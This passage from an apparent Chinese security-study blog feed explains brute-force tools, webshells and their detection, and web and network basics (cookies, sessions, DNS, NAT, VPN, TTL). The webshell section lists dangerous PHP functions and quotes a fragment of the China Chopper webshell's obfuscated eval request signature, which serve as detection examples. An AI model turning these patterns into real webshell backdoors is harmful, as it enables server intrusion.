id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a><font color="#FF0000">暴力破解</font></h1><hr><ol><li>介绍：已经知道一个帐号的用户名，但是还不知道密码的情况下，用暴力破解的软件去不断尝试各种密码，以试图获得正确密码的手段。简单说就是猜测用户名和密码。(有些盲注、穷举文件)</li><li>常见工具：最常用的burpsuite有这个功能，hydra、medusa等。一般面向服务器方面的安全，hydra最好用。web就是burp或者owasp的zap。或者Python自己开发的小工具都挺容易实现的。还有一些基于彩虹表的，类似RainbowCrack。</li></ol><p>#未完待续……</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入漏洞 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> 命令注入漏洞 </tag>
            
            <tag> XXS漏洞 </tag>
            
            <tag> CSRF漏洞 </tag>
            
            <tag> SSRF漏洞 </tag>
            
            <tag> 暴力破解 </tag>
            
            <tag> 信息泄露类漏洞 </tag>
            
            <tag> DNS rebinding攻击 </tag>
            
            <tag> 远程代码执行漏洞 </tag>
            
            <tag> url重定向攻击 </tag>
            
            <tag> XML注入攻击 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Web基础知识理论</title>
      <link href="/2019/03/03/Web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%90%86%E8%AE%BA/"/>
      <url>/2019/03/03/Web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%90%86%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">Web知识</font></center><h1 id="HTTTP代理"><a href="#HTTTP代理" class="headerlink" title="HTTTP代理"></a><font color="#FF0000">HTTTP代理</font></h1><hr><p>HTTP代理原理：代理位于浏览器和Web服务器之间，有了他之后，浏览器不是直接连接Web服务器去取回网页而是向HTTP代理发出请求，请求数据包会先送到HTTP代理，由HTTP代理来取回浏览器所需要的信息并传送给你的浏览器。<br>简而言之，HTTP代理位于浏览器和Web服务器之间，充当“中间人” 的角色。<br>代理的作用：通过代理我们可以查看、分析浏览器和Web服务器之间的HTTP通信数据。通过查看HTTP流浪，我们可以方便的测试各种Web漏洞，如SQL注入、文件上传、弱口令。<br><img src="https://s2.ax1x.com/2019/03/03/kLoJ8P.png" alt="image"></p><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><font color="#FF0000">webshell</font></h1><hr><ol><li>介绍：以sap、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以称为网页后门。黑客们在入侵一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</li><li>危害：webshell拥有文件上传、编辑、删除、重命名，执行系统命令、服务器管理，提权等功能。当网站被上传webshell就意味着你的网站已被入侵，攻击者基本上可以 对你的网站为所欲为，包括篡改你的网页，窃取或删除数据库数据等高危操作；通过提升权限还可以完全控制整个服务器；另外还可以作为跳板进行下一步的渗透。拿到Webshell，可以修改网站的文件；（相当于控制整个网站）如果未做好权限控制还可以查看服务器上其他的网站（同服渗透）；利用Webshell作为跳板继续渗透服务器（如提权，内网渗透）；</li><li>检测手段和原理：<br>①关键字匹配：即是对文件内容中的危险函数并可带入请求的关键字或是特定webshell的关键字进行匹配；例如的eval、assert、exec、call_user_func、 call_user_func_array、array_map、preg_replace’Shell.Application’、’XXX专用大马’、’提权’等。通过搜集各种webshell样本组建正则进行匹配。还有危险的后缀 名，如asa、cer、php4|5等。<br>②流量检测：通过收集发送请求的特征对网站的流量进行检测，例如著名webshell客户端“中国菜刀”最新版的HTTP请求中就包含：array_map(“ass”.”ert”,array(“ev”.”Al(\”\\$xx%3D\\”Ba”.”SE6”.”4_dEc”.”OdE\\”;@ev”.”al(\\$xx(‘  在流量中检测出包含类似这一段关键字的请求就必然是中国菜刀webshell。<br>③agent检测：在服务器安装监控探针；例如通过监控系统文件，对新增的文件进行常规的webshell检测，可实时发现webshell；监控系统进程，当web服务的用户的权限起了个cmd或bash就有问题了。还有反 连的检测。通过agent可从多个角度去发现和拦截webshell攻击。<br>④语法检测：语法检测可检测出构造奇妙的webshell；若文件经过加密编码单靠关键字匹配是无法检测出来的，用语法语义分析形式，根据php语言扫描编译的实现方式 ，进行剥离代码、注释，分析变量、函数、字符串、语言结构，来实现关键危险函数的捕捉方式。<br>⑤统计学检测：通过检测文件的信息熵，最长单词、IC值等数学方式判断文件是否危险。这种方法混淆加密的webshll检测有不错的作用。例如信息熵是代表一个文件的 混乱程度，越是没有规则的文件内容熵就越高，加密过的webshell通常都是无序的；而检索出的最长单词是异常的话则表明文件代码被编码过，要是一大串单词连着肯 定有问题。<br>⑥当然，检测webshell的方法还不止于此，检测webshell，可以从多个维度去发现，一个webshell的生命周期里接触的所有维度，攻击漏洞、webshell代码、文件生成、 行为、窃取资料、痕迹擦除等都可提取检测特征。不要从单纯检测webshell出发。</li><li>检测工具：<br>①啊D：webshell查杀工具 支持所有脚本类型，可检测众多特殊函数和变量函数，效果非常不错。并有文件监控，进程监控等功能。<br>②河马网站后门检测与查杀工具 ：支持linux，windows，并提供在线检测API。<br>③Pecker Scanner：是一个PHP语言编写的基于php语法扫描、词法分析的webshell扫描工具。该项目太久没更新了，但也值得借鉴。<br>④NeoPI ：是一个基于统计学的webshell检测脚本，支持关键字特征、信息熵、重合指数、最长单词等检测方式，对一些加密编码过的webshell识别不错，但是没有混淆过的就基本检测不出来。</li></ol><h1 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a><font color="#FF0000">子网掩码</font></h1><hr><p>一种用来指明一个IP地址的哪些位标识的是主机所在的子网，以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合IP地址一起使用。子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分。子网掩码是一个32位地址，用于屏蔽IP地址的一部分以区别网络标识和主机标识，并说明该IP地址是在局域网上，还是在远程网上。对于A类地址来说，默认的子网掩码是255.0.0.0；对于B类地址来说默认的子网掩码是255.255.0.0；对于C类地址来说默认的子网掩码是255.255.255.0。<br>定义子网掩码的步骤为：<br>A、确定哪些组地址归我们使用。比如我们申请到的网络号为 “210.73.a.b”，该网络地址为c类IP地址，网络标识为“210.73.a”，主机标识为“b”。<br>B、根据我们所需的子网数以及将来可能扩充到的子网数，用宿主机的一些位来定义子网掩码。比如我们需要12个子网，将来可能需要16个。用第四个字节的前四位确定子网掩码。前四位都置为“1”，即第四个字节为“11110000”，这个数我们暂且称作新的二进制子网掩码。<br>C、把对应初始网络的各个位都置为“1”，即前三个字节都置为“1”，则子网掩码的间断二进制形式为：“11111111.11111111.11111111.11110000”。<br>D、把这个数转化为间断十进制形式为：“255.255.255.240” 。  </p><h1 id="默认网关"><a href="#默认网关" class="headerlink" title="默认网关"></a><font color="#FF0000">默认网关</font></h1><hr><p>网关在传输层上以实现网络互连，是最复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关既可以用于广域网互连，也可以用于局域网互连。网关是一种充当转换重任的计算机系统或设备。在使用不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同时，网关也可以提供过滤和安全功能。在没有路由器的情况下，两个网络之间是不能进行TCP/IP通信的，即使是两个网络连接在同一台交换机（或集线器）上，TCP/IP协议也会根据子网掩码（255.255.255.0）判定两个网络中的主机处在不同的网络里。而要实现这两个网络之间的通信，则必须通过网关。如果网络A中的主机发现数据包的目的主机不在本地网络中，就把数据包转发给它自己的网关，再由网关转发给网络B的网关，网络B的网关再转发给网络B的某个主机。网络B向网络A转发数据包的过程也是如此。所以说，只有设置好网关的IP地址，TCP/IP协议才能实现不同网络之间的相互通信。就好像一个房间可以有多扇门一样，一台主机可以有多个网关。默认网关的意思是一台主机如果找不到可用的网关，就把数据包发给默认指定的网关，由这个网关来处理数据包。现在主机使用的网关，一般指的是默认网关。<br>这就是为什么我们在路由器上网的时候，必须要把计算机中的默认网关地址设置成路由器LAN接口地址的原因，因为路由器的LAN接口就是你所在网络的网关，你的电脑要上网，数据必须经过网关转发出去。在一般的路由器网络中，默认网关最常见的一般是：192.168.1.1和192.168.0.1，也就是路由器LAN接口的默认IP地址。当然，也有一些智能路由器会使用其它IP地址作为默认网关，这个主要是路由器厂商出厂前设定的。  </p><h1 id="DNS服务器地址"><a href="#DNS服务器地址" class="headerlink" title="DNS服务器地址"></a><font color="#FF0000">DNS服务器地址</font></h1><hr><p>互联网上的每一台电脑都被分配一个IP地址，数据的传输实际上是在不同IP地址之间进行的。包括我们在家上网时使用的电脑，在连上网以后也被分配一个IP地址，这个IP地址绝大部分情况下是动态的。也就是说你关掉调制解调器，再重新打开上网，你的上网接入商会随机分配一个新的IP地址。<br>网站服务器本质上也是一台连上网的电脑，只不过配置上更适合作为服务器，并且放在数据中心，保持低温，低尘环境，同时有安全保卫。这些服务器使用固定IP地址连入互联网。<br>一个域名解析到某一台服务器上，并且把网页文件放到这台服务器上，用户的电脑才知道去哪一台服务器获取这个域名的网页信息。这是通过域名服务器来实现的。<br>域名服务器是英文Domain Name Server的缩写。每一个域名都至少要有两个DNS服务器，这样如果其中一个DNS服务器出现问题，另外一个也可以返回关于这个域名的数据。DNS服务器也可以有两个以上，但所有这些DNS服务器上的DNS记录都应该是相同的。<br>在DNS服务器中保留有该域名的DNS记录，比如A记录，MX记录。A记录是用来指定主机名（或域名）对应的IP地址。MX记录用来解析域名的邮件服务器。在很多情况下。<br>当一个浏览者在浏览器地址框中打入某一个域名，或者从其他网站点击了链接来到了这个域名，浏览器向这个用户的上网接入商发出域名请求，接入商的DNS服务器要查询域名数据库，看这个域名的DNS服务器是什么。然后到DNS服务器中抓取DNS记录，也就是获取这个域名指向哪一个IP地址。在获得这个IP信息后，接入商的服务器就去这个IP地址所对应的服务器上抓取网页内容，然后传输给发出请求的浏览器。<br>这个过程描述起来蛮复杂，但实际上不到一两秒钟就完成了。<br><img src="https://s2.ax1x.com/2019/03/01/kbV2Oe.png" alt="image"></p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a><font color="#FF0000">Cookie</font></h1><hr><ol><li>Cookie机制：介绍Cookie通过在客户端记录信息确定用户身份。就像购物一样，一个顾客的东西应该对应放入他的购物篮。那么一个用户的请求应该同属一个会话，而另一个用户的所有请求应该属于另外一个会话。<br>但是Web应用程序是使用的HTTP协议传输数据的，HTTP是无状态协议(无状态是指协议对于事务处理没有记忆能力)。这意味着服务器无法从连接上跟踪会话，也无法知道客户身份，单次连接都需要建立新的连接。而cookie就可以弥补HTTP协议无状态的不足。</li><li>什么是Cookie：Cookie就相当于服务端给客户端颁发的通行证，而客户端访问时，都必须提供自己的通行证。<br>Cookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。服务器还可以根据需要修改Cookie的内容。</li><li>Cookie信息查看：不同网站对其颁布的Cookie都会进行不同的加密或者处理。<br>IE浏览器会在“C:\Documents and Settings\你的用户名\Cookies”文件夹下以文本文件形式保存，一个文本文件保存一个Cookie。<br>在浏览器的地址栏输入：javascript:alert(document.cookie)  (不区分大小写)，就会弹出你在当前网页登录的cookie信息。（但是当你尝试这样去查看当前网站的Cookie时，你会发现javascript字符串消失不见了，应为会被自动过滤隐藏，只需在前面加个1再复制后删去1即可。）</li><li>Cookie作用：<br>①记录用户访问次数。<br>②Cookie不可跨域名性(不同域名的cookie不可相互使用)<br>③中文属于Unicode字符，内存中占四个字符Cookie中需要对他进行编码(Cookie中保存中文只能编码。一般使用UTF-8编码即可。不推荐使用GBK等中文编码，因为浏览器不一定支持，而且JavaScript也不支持GBK编码。)<br>④Cookie还可以使用二进制，如数字证书。</li><li>Cookie内容：<br>①Cookie内容应该少而精(否则会影响速度)<br>②常用属性：<br><font color="#FF0000">String name</font>：该Cookie的名称。Cookie一旦创建，名称便不可更改<br><font color="#FF0000">Object value</font>：该Cookie的值。如果值为Unicode字符，需要为字符编码。如果值为二进制数据，则需要使用BASE64编码<br><font color="#FF0000">int maxAge</font>：该Cookie失效的时间，单位秒。如果为正数，则该Cookie在maxAge秒之后失效。如果为负数，<br>Cookie为临时Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该Cookie。如果为0，表示删除该Cookie。默认为–1<br><font color="#FF0000">boolean secure</font>：该Cookie是否仅被使用安全协议传输。安全协议。安全协议有HTTPS，SSL等，在网络上传输数据之前先将数据加密。默认为false<br><font color="#FF0000">String path</font>：该Cookie的使用路径。如果设置为“/sessionWeb/”，则只有contextPath为“/sessionWeb”的程序可以访问该Cookie。如果设置为“/”，则本域名下contextPath都可以访问该Cookie。注意最后一个字符必须为“/”<br><font color="#FF0000">String domain</font>：可以访问该Cookie的域名。如果设置为“.google.com”，则所有以“google.com”结尾的域名都可以访问该Cookie。注意第一个字符必须为“.”<br><font color="#FF0000">String comment</font>：该Cookie的用处说明。浏览器显示Cookie信息的时候显示该说明<br><font color="#FF0000">int version</font>：该Cookie使用的版本号。0表示遵循Netscape的Cookie规范，1表示遵循W3C的RFC 2109规范</li><li>Cookie有效期：<br>①Cookie的<font color="#FF0000">maxAge函数</font>决定着Cookie的有效期，单位为秒（Second）。 Cookie中通过getMaxAge()方法与setMaxAge(int maxAge)方法来读写maxAge属性。<br>②如果maxAge属性为正数，则表示该Cookie会在maxAge秒之后自动失效。浏览器会将maxAge为正数的Cookie持久化，即写到对应的Cookie文件中。无论客户关闭了浏览器还是电脑，只要还在maxAge秒之前，登录网站时该Cookie仍然有效。<br>③如果maxAge为负数，则表示该Cookie仅在本浏览器窗口以及本窗口打开的子窗口内有效，关闭窗口后该Cookie即失效。maxAge为负数的Cookie，为临时性Cookie，不会被持久化，不会被写到Cookie文件中。Cookie信息保存在浏览器内存中，因此关闭浏览器该Cookie就消失了。Cookie默认的maxAge值为–1。<br>④如果maxAge为0，则表示删除该Cookie。Cookie机制没有提供删除Cookie的方法，因此通过设置该Cookie即时失效实现删除Cookie的效果。失效的Cookie会被浏览器从Cookie文件或者内存中删除。</li><li>Cookie的删除和修改：<br>①Cookie不提供直接删除和修改的操作。<br>②修改某个Cookie，只需要新建一个同名的Cookie，添加到response中覆盖原来的Cookie(修改需要的数据)<br>③删除某个Cookie，只需要新建一个同名的Cookie，添加到response中覆盖原来的Cookie(设置maxAge为0)<br>④修改、删除Cookie时，新建的Cookie除value、maxAge之外的所有属性，例如name、path、domain等，都要与原Cookie完全一样。否则，浏览器将视为两个不同的Cookie不予覆盖，导致修改、删除失败。</li><li>Cookie的域名性：Cookie是不可以跨域名的。Cookie的隐私安全机制能够禁止网站非法获取其他网站的Cookie。同一个域名下的两个二级域名。”1.haha.cm”和”2.haha.cm”也不能交互使用Cookie，需要设置Cookie的domain参数为：cookie.setDomain(“.helloweenvsfei.com”);才可以！<br>domain参数必须以点(“.”)开始。另外，name相同但domain不同的两个Cookie是两个不同的Cookie。如果想要两个域名完全不同的网站共有Cookie，可以生成两个Cookie，domain属性分别为两个域名，输出到客户端。</li><li><p>Cookie的路径：domain属性决定运行访问Cookie的域名，而path属性决定允许访问Cookie的路径<br>如：如果只允许/sessionWeb/下的程序使用Cookie，可以这么写：  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie = <span class="keyword">new</span> Cookie(<span class="string">"time"</span>,<span class="string">"20080808"</span>);   S<span class="comment">// 新建Cookie</span></span><br></pre></td></tr></table></figure><p>注意：设置为“/”时允许所有路径使用Cookie。 path属性需要使用符号“/”结尾。 name相同但domain相同的两个Cookie也是两个不同的Cookie。</p></li><li><p>Cookie的安全属性：HTTP协议不仅是无状态的，而且是不安全的。使用HTTP协议的数据不经过任何加密就直接在网络上传播，有被截获的可能。使用HTTP协议传输很机密的内容是一种隐患。如果不希望Cookie在HTTP等非安全协议中传输，可以设置Cookie的secure属性为true。浏览器只会在HTTPS和SSL等安全协议中传输此类Cookie。<br>下面的代码设置secure属性为true： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie = <span class="keyword">new</span> Cookie(<span class="string">"time"</span>, <span class="string">"20080808"</span>);<span class="comment">// 新建Cookie  </span></span><br><span class="line">cookie.setSecure(<span class="keyword">true</span>);                         <span class="comment">// 设置安全属性  </span></span><br><span class="line">response.addCookie(cookie);                     <span class="comment">// 输出到客户端</span></span><br></pre></td></tr></table></figure><p>注意：secure属性并不能对Cookie内容加密，因而不能保证绝对的安全性。如果需要高安全性，需要在程序中对Cookie内容加密、解密，以防泄密。</p></li><li><p>JavaScript操作Cookie：Cookie是保存在浏览器端的，因此浏览器具有操作Cookie的先决条件。浏览器可以使用脚本程序如JavaScript或者VBScript等操作Cookie。这里以JavaScript为例介绍常用的Cookie操作。例如下面的代码会输出本页面所有的Cookie。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="built_in">document</span>.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>由于JavaScript能够任意地读写Cookie，有些好事者便想使用JavaScript程序去窥探用户在其他网站的Cookie。不过这是徒劳的，W3C组织早就意识到JavaScript对Cookie的读写所带来的安全隐患并加以防备了，<font color="#FF0000">W3C标准的浏览器会阻止JavaScript读写任何不属于自己网站的Cookie</font>。换句话说，A网站的JavaScript程序读写B网站的Cookie不会有任何结果。</p></li></ol><h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a><font color="#FF0000">Session</font></h1><hr><ol><li>Session机制：除了使用Cookie，Web应用程序中还经常使用Session来记录客户端状态。Session是服务器端使用的一种记录客户端状态的机制，使用上比Cookie简单一些，相应的也增加了服务器的存储压力。</li><li>Session介绍：Session通过在服务器端记录信息确定用户身份。<br>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。<br>客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。(所以增加了服务器的存储压力)<br>如果说Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话。那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份。</li><li>Session实现用户登录：Session对应的类为javax.servlet.http.HttpSession类。<br>每个来访者对应一个Session对象，所有该客户的状态信息都保存在这个Session对象里。Session对象是在客户端第一次请求服务器的时候创建的。<br>注意：程序中Session中直接保存了Person类对象与Date类对象，使用起来要比Cookie方便。多个客户端执行程序时，服务器会保存多个客户端的Session。获取Session的时候也不需要声明获取谁的Session。Session机制决定了当前客户只会获取到自己的Session，而不会获取到别人的Session。各客户的Session也彼此独立，互不可见。</li><li>Session的生命周期：<br>①保存：Session保存在服务器端。为了获得更高的存取速度，服务器一般把Session放在内存里。每个用户都会有一个独立的Session。如果Session内容过于复杂，当大量客户访问服务器时可能会导致内存溢出。因此，Session里的信息应该尽量精简。<br>②自动创建：Session在用户第一次访问服务器的时候自动创建。需要注意只有访问JSP、Servlet等程序时才会创建Session，只访问HTML、IMAGE等静态资源并不会创建Session。如果尚未生成Session，也可以使用request.getSession(true)强制生成Session。<br>③访问更新：Session生成后，只要用户继续访问，服务器就会更新Session的最后访问时间，并维护该Session。用户每访问服务器一次，无论是否读写Session，服务器都认为该用户的Session“活跃（active）”了一次。<br>④自动清除：由于会有越来越多的用户访问服务器，因此Session也会越来越多。为防止内存溢出，服务器会把长时间内没有活跃的Session从内存删除。这个时间就是Session的超时时间(maxInactiveInterval属性)。如果超过了超时时间没访问过服务器，Session就自动失效了。</li><li>Session常用方法函数：<br><font color="#FF0000">void setAttribute(String attribute, Object value)</font><br>设置Session属性。value参数可以为任何Java Object。通常为java Bean。value信息不宜过大<br><font color="#FF0000">String getAttribute(String attribute)</font><br>返回Session属性<br><font color="#FF0000">Enumeration getAttributeNames()</font><br>返回Session中存在的属性名<br><font color="#FF0000">void removeAttribute(String attribute)</font><br>移除Session属性<br><font color="#FF0000">String getId()</font><br>返回Session的ID。该ID由服务器自动创建，不会重复<br><font color="#FF0000">long getCreationTime()</font><br>返回Session的创建日期。返回类型为long，常被转化为Date类型<br>例如：Date createTime = new Date(session.get CreationTime())<br><font color="#FF0000">long getLastAccessedTime()</font><br>返回Session的最后活跃时间。返回类型为long<br><font color="#FF0000">int getMaxInactiveInterval()</font><br>返回Session的超时时间。单位为秒。超过该时间没有访问，服务器认为该Session失效<br><font color="#FF0000">void setMaxInactiveInterval(int second)</font><br>设置Session的超时时间。单位为秒<br><font color="#FF0000">void putValue(String attribute, Object value)</font><br>不推荐的方法。已经被setAttribute(String   attribute, Object Value)替代<br><font color="#FF0000">Object getValue(String attribute)</font><br>不被推荐的方法。已经被getAttribute(String   attr)替代<br><font color="#FF0000">boolean isNew()</font><br>返回该Session是否是新创建的<br><font color="#FF0000">void invalidate()</font><br>使该Session失效</li><li>Session对浏览器的要求：<br>①Session依据该Cookie来识别是否为同一用户。虽然Session保存在服务器，对客户端是透明的，它的正常运行仍然需要客户端浏览器的支持，因为Session需要使用Cookie作为识别标志。HTTP协议是无状态的，Session不能依据HTTP连接来判断是否为同一客户，因此服务器向客户端浏览器发送一个名为JSESSIONID的Cookie，它的值为该Session的id（也就是HttpSession.getId()的返回值）。它的maxAge属性一般为–1。<br>②但是如果将Cookie功能禁用，或者不支持Cookie怎么办。比如绝大数手机浏览器都不支持Cookie，Java Web提供了一种方法：UR地址L重写。<br>③重写URL地址：<br>原理：将该用户Session的id信息重写到URL地址中，服务器解析重写后的URL获取Session的id，不支持Cookie也可以记录用户状态。</li><li><p>Session中禁止使用Cookie：<br>既然存在有些浏览器不支持Cookie，为了统一，索性禁止Session使用Cookie，统一使用URL地址重写。<br>禁用方法：打开项目sessionWeb的WebRoot目录下的META-INF文件夹，打开context.xml，修改属性。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">"/sessionWeb"</span><span class="attr">cookies</span>=<span class="string">"false"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：该配置只是禁止Session使用Cookie作为识别标志，并不能阻止其他的Cookie读写。也就是说服务器不会自动维护名为JSESSIONID的Cookie了，但是程序中仍然可以读写其他的Cookie</p></li></ol><h1 id="浏览器工作机制"><a href="#浏览器工作机制" class="headerlink" title="浏览器工作机制"></a><font color="#FF0000">浏览器工作机制</font></h1><ol><li>浏览器主要是解析渲染Web中间件响应的HTML、JavaScript、CSS等资源。<br><img src="https://s2.ax1x.com/2019/03/06/kvpBQO.png" alt="image"></li><li>HTML：用来描述Web网页的一种静态标记语言。Web浏览器的作用是读取HTML文档，并以网页的形式显示他们。浏览器不会显示HTML标签，而是使用标签来解释页面的内容。 </li><li>JavaScript是一种轻量级的脚本语言，JavaScript代码可插入HTML页面，并由所有的现代浏览器执行，JavaScript能够改变任意HTML元素的大多属性，JavaScript往往用来改善HTML的展现，比如炫酷的网页效果、移动鼠标自动改变的网页颜色等</li></ol><h1 id="SSL安全套接层"><a href="#SSL安全套接层" class="headerlink" title="SSL安全套接层"></a><font color="#FF0000">SSL安全套接层</font></h1><hr><p>介绍：保障Internet上数据传输之安全，利用数据加密技术，可确保数据在网络上之传输过程中不会被截取及窃听。SSL协议位于TCP/IP协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p><h1 id="VPN虚拟专用网络"><a href="#VPN虚拟专用网络" class="headerlink" title="VPN虚拟专用网络"></a><font color="#FF0000">VPN虚拟专用网络</font></h1><hr><ol><li>介绍：在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。VPN有多种分类方式，主要是按协议进行分类。VPN可通过服务器、硬件、软件等多种方式实现。VPN属于远程访问技术，简单地说就是利用公用网络架设专用网络。  </li><li>工作原理：<br>①通常情况下，VPN网关采取双网卡结构，外网卡使用公网IP接入Internet。<br>②网络一(假定为公网internet)的终端A访问网络二(假定为公司内网)的终端B，其发出的访问数据包的目标地址为终端B的内部IP地址。<br>③网络一的VPN网关在接收到终端A发出的访问数据包时对其目标地址进行检查，如果目标地址属于网络二的地址，则将该数据包进行封装，封装的方式根据所采用的VPN技术不同而不同，同时VPN网关会构造一个新VPN数据包，并将封装后的原数据包作为VPN数据包的负载，VPN数据包的目标地址为网络二的VPN网关的外部地址。<br>④网络一的VPN网关将VPN数据包发送到Internet，由于VPN数据包的目标地址是网络二的VPN网关的外部地址，所以该数据包将被Internet中的路由正确地发送到网络二的VPN网关。<br>⑤网络二的VPN网关对接收到的数据包进行检查，如果发现该数据包是从网络一的VPN网关发出的，即可判定该数据包为VPN数据包，并对该数据包进行解包处理。解包的过程主要是先将VPN数据包的包头剥离，再将数据包反向处理还原成原始的数据包。<br>⑥网络二的VPN网关将还原后的原始数据包发送至目标终端B，由于原始数据包的目标地址是终端B的IP，所以该数据包能够被正确地发送到终端B。在终端B看来，它收到的数据包就和从终端A直接发过来的一样。<br>⑦从终端B返回终端A的数据包处理过程和上述过程一样，这样两个网络内的终端就可以相互通讯了。  </li></ol><h1 id="NAT地址转换"><a href="#NAT地址转换" class="headerlink" title="NAT地址转换"></a><font color="#FF0000">NAT地址转换</font></h1><hr><ol><li>实现方式：<br>①静态转换是指将内部网络的私有IP地址转换为公有IP地址，IP地址对是一对一的，是一成不变的，某个私有IP地址只转换为某个公有IP地址。借助于静态转换，可以实现外部网络对内部网络中某些特定设备（如服务器）的访问。<br>②动态转换是指将内部网络的私有IP地址转换为公用IP地址时，IP地址是不确定的，是随机的，所有被授权访问上Internet的私有IP地址可随机转换为任何指定的合法IP地址。也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行动态转换。动态转换可以使用多个合法外部地址集。当ISP提供的合法IP地址略少于网络内部的计算机数量时。可以采用动态转换的方式。<br>③端口多路复用（Port address Translation,PAT)是指改变外出数据包的源端口并进行端口转换，即端口地址转换（PAT，Port Address Translation).采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问，从而可以最大限度地节约IP地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自internet的攻击。因此，目前网络中应用最多的就是端口多路复用方式。  </li><li>功能：NAT不仅能解决IP地址不足的问题，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机。可以实现宽带分享、安全防护。</li><li>工作原理：借助于NAT，私有（保留）地址的”内部”网络通过路由器发送数据包时，私有地址被转换成合法的IP地址，一个局域网只需使用少量IP地址（甚至是1个）即可实现私有地址网络内所有计算机与Internet的通信需求。NAT将自动修改IP报文的源IP地址和目的IP地址，Ip地址校验则在NAT处理过程中自动完成。有些应用程序将源IP地址嵌入到IP报文的数据部分中，所以还需要同时对报文的数据部分进行修改，以匹配IP头中已经修改过的源IP地址。否则，在报文数据部分嵌入IP地址的应用程序就不能正常工作。</li></ol><h1 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a><font color="#FF0000">X-Forwarded-For</font></h1><hr><p>X-Forwarded-For是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br>Squid 缓存代理服务器的开发人员最早引入了这一HTTP头字段，并由IETF在Forwarded-For HTTP头字段标准化草案中正式提出。<br>当今多数缓存服务器的使用者为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下, 这些代理服务器是透明代理, 用户甚至不知道自己正在使用代理上网。<br>如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址(而非连接发起的原始IP地址), 这样的代理服务器实际上充当了匿名服务提供者的角色, 如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。XFF的有效性依赖于代理服务器提供的连接原始IP地址的真实性，因此, XFF的有效使用应该保证代理服务器是可信的, 比如可以通过建立可信服务器白名单的方式。  </p><h1 id="TTL生存时间值"><a href="#TTL生存时间值" class="headerlink" title="TTL生存时间值"></a><font color="#FF0000">TTL生存时间值</font></h1><hr><ol><li>介绍：TTL是 Time To Live的缩写，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量，实际上TTL是IP数据包在计算机网络中可以转发的最大跳数。TTL是IPv4包头的一个8 bit字段。</li><li>作用：TTL的作用是限制IP数据包在计算机网络中的存在的时间。TTL的最大值是255，TTL的一个推荐值是64。TTL字段由IP数据包的发送者设置，在IP数据包从源到目的的整个转发路径上，每经过一个路由器，路由器都会修改这个TTL字段值，具体的做法是把该TTL的值减1，然后再将IP包转发出去。如果在IP包到达目的IP之前，TTL减少为0，路由器将会丢弃收到的TTL=0的IP包并向IP包的发送者发送 ICMP time exceeded消息。主要作用是避免IP包在网络中的无限循环和收发，节省了网络资源，并能使IP包的发送者能收到告警消息。</li></ol><h1 id="HTTP-REFERER的用法及伪造"><a href="#HTTP-REFERER的用法及伪造" class="headerlink" title="HTTP_REFERER的用法及伪造"></a><font 